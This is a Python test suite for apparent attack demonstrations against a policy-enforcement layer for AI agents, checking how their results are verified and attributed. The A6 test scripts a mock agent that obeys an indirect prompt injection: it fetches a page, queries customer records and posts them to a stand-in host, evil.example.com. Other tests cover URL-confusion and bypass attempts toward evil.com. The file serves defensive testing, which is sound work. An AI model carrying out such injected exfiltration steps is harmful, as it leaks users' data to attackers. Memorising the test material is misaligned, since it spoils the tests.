"""Tests for the ten M3/C1-C2-fix attack demonstrations (attacks/a1.py .. a10.py). Every test here
runs in this sandbox's no-Docker environment, so the "attempt the real, role-verified live stack"
branch in each script never succeeds — these tests exercise (and assert) the UNVERIFIED fallback
behavior, not a live Docker run. See docs/verification-log.md for what has and hasn't been
independently confirmed against a real deployment, and docs/hostile-review.md's C1/C2 entries for
why every attack now requires a genuinely role-verified live measurement, not just "was denied," to
count as demonstrating its own claimed mechanism.
"""

from __future__ import annotations

import attacks.a1 as a1
import attacks.a2 as a2
import attacks.a3 as a3
import attacks.a4 as a4
import attacks.a5 as a5
import attacks.a6 as a6
import attacks.a7 as a7
import attacks.a8 as a8
import attacks.a9 as a9
import attacks.a10 as a10
from attacks.common import UNVERIFIED

ALL_ATTACKS = (a1, a2, a3, a4, a5, a6, a7, a8, a9)


def test_every_attack_is_unverified_and_not_genuinely_verified_without_docker():
    """The C1/C2 fix's core property, now uniform across all nine attacks (previously only A4/A9
    were held to this standard): with no Docker reachable, none of them may report
    REAL_DOCKER_VERIFIED or count as genuinely_verified - a local replay is supplementary evidence
    only, never a substitute for the real, role-verified live path.

    WHY .blocked itself isn't asserted False here for every attack: A9 is a structural exception,
    unchanged from before this fix - its UNVERIFIED fallback still runs a real local listener that
    genuinely denies the raw connect attempt, so .blocked is legitimately True even while
    genuinely_verified (the property that actually gates counting) is correctly False. See
    test_a9_does_not_count_an_exception_as_blocked below for A9's own specific check."""
    for module in ALL_ATTACKS:
        result = module.run()
        assert (
            result.verification_status == UNVERIFIED
        ), f"{module.__name__} reported {result.verification_status} with no Docker reachable"
        assert (
            result.genuinely_verified is False
        ), f"{module.__name__} counted itself as genuinely verified, no Docker"
        assert result.mechanism_match is None


def test_every_attack_reports_a_nonempty_event_and_notes():
    for module in ALL_ATTACKS:
        result = module.run()
        assert result.event, f"{module.__name__} produced no event"
        assert result.notes, f"{module.__name__} gave no notes explaining its verification status"


def test_every_attack_declares_its_own_expected_mechanism():
    """Every attack must state what it's specifically trying to prove (assess_mechanism() has
    nothing to grade against otherwise) - this is what makes "denied for the wrong reason" a
    detectable failure instead of an unfalsifiable pass."""
    for module in ALL_ATTACKS:
        result = module.run()
        assert result.expected_decision, f"{module.__name__} has no expected_decision"
        assert result.expected_reason, f"{module.__name__} has no expected_reason"


# =====================================================================================
# A4 — must identify both workload identities, and must not claim REAL_DOCKER_VERIFIED
# without actually reaching the live, role-verified stack
# =====================================================================================


def test_a4_identifies_source_and_dest_workload():
    result = a4.run()
    assert "agent" in result.identity_desc
    assert "finance-agent" in result.identity_desc
    assert result.event["role"] == "research_agent"
    assert result.event["resource"] == "finance-agent"


def test_a4_is_unverified_not_falsely_blocked_without_docker():
    result = a4.run()
    assert result.verification_status == UNVERIFIED
    assert result.blocked is False
    assert any("supplementary" in note for note in result.notes)


# =====================================================================================
# A6 — the mock provider must genuinely comply, not detect and refuse
# =====================================================================================


def test_a6_mock_provider_genuinely_complies_regardless_of_conversation_state():
    """MockProvider.next_turn() must return the scripted db.query/http.post calls unconditionally
    — it does not inspect `messages` at all, which is exactly what "complies, does not detect"
    means in code: nothing here evaluates whether the instruction was safe."""
    from agent.providers import MockProvider

    provider = MockProvider(scenario="m3_indirect_prompt_injection")
    calls = []
    while True:
        turn = provider.next_turn(messages=[{"anything": "irrelevant"}], tools=[])
        if not turn.tool_calls:
            break
        calls.extend(turn.tool_calls)
    assert [c.name for c in calls] == ["http.get", "db.query", "http.post"]
    assert calls[1].arguments == {"table": "customers"}
    assert calls[2].arguments["url"] == "https://evil.example.com/collect"


def test_a6_attack_result_shows_all_three_steps_attempted_via_supplementary_note():
    result = a6.run()
    assert result.verification_status == UNVERIFIED  # no Docker in this environment
    joined_notes = " ".join(result.notes)
    assert "step 3" in joined_notes or "session_id so taint genuinely carried" in joined_notes


# =====================================================================================
# A8 — normalization must be destination-preserving in both directions
# =====================================================================================


def test_a8_canonicalizes_to_the_real_host_not_the_confusing_prefix():
    from pep.normalize import normalize_url

    assert normalize_url(a8.RAW_URL).fqdn == "api.trusted-news.com"
    assert normalize_url(a8.MIRROR_URL).fqdn == "evil.com"


def test_a8_destination_is_the_real_canonical_host():
    result = a8.run()
    assert result.destination == "http://api.trusted-news.com/"


# =====================================================================================
# A9 — bypass event attribution
# =====================================================================================


def test_a9_local_fallback_captures_a_real_attributed_event():
    result = a9.run()
    assert result.verification_status == UNVERIFIED  # no Docker in this environment
    assert result.event.get("reason") == "BYPASS_ATTEMPTED"
    assert result.event.get("decision") == "DENY"
    assert "evil.com" in result.event.get("destination", {}).get("fqdn", "")


def test_a9_does_not_count_an_exception_as_blocked():
    """The milestone's own instruction: an exception (here, a connection failure to the live
    listener) must not be silently treated as "blocked." A9 is UNVERIFIED, and genuinely_verified
    must be False, even though a supplementary local check happened to show a denial."""
    result = a9.run()
    assert not result.genuinely_verified


# =====================================================================================
# A10 — deliberate quarantine-cascade demonstration, never counted as independent evidence
# =====================================================================================


def test_a10_is_not_demonstrated_without_docker():
    """With no live, shared eventstore to persist quarantine across two real calls, A10 cannot
    honestly claim to have demonstrated the cascade - both calls must come back UNVERIFIED, and
    demonstrates_cascade must be False, not assumed True."""
    result = a10.run()
    assert result.call_1.verification_status == UNVERIFIED
    assert result.call_2.verification_status == UNVERIFIED
    assert result.demonstrates_cascade is False


def test_a10_calls_declare_different_expected_reasons():
    """Call 1's own mechanism (default-deny) and call 2's expected AGENT_QUARANTINED mechanism
    must be distinct expectations - conflating them would silently defeat the point of the
    demonstration."""
    result = a10.run()
    assert result.call_1.expected_reason != result.call_2.expected_reason
    assert result.call_2.expected_reason == "AGENT_QUARANTINED"


# =====================================================================================
# assess_mechanism() — the C2 fix's core rule
# =====================================================================================


def test_assess_mechanism_requires_both_decision_and_reason_to_match():
    from attacks.common import assess_mechanism

    assert assess_mechanism("DENY", "no_matching_rule", "DENY", "no_matching_rule") is True
    assert assess_mechanism("DENY", "AGENT_QUARANTINED", "DENY", "no_matching_rule") is False
    assert assess_mechanism("ALLOW", "no_matching_rule", "DENY", "no_matching_rule") is False
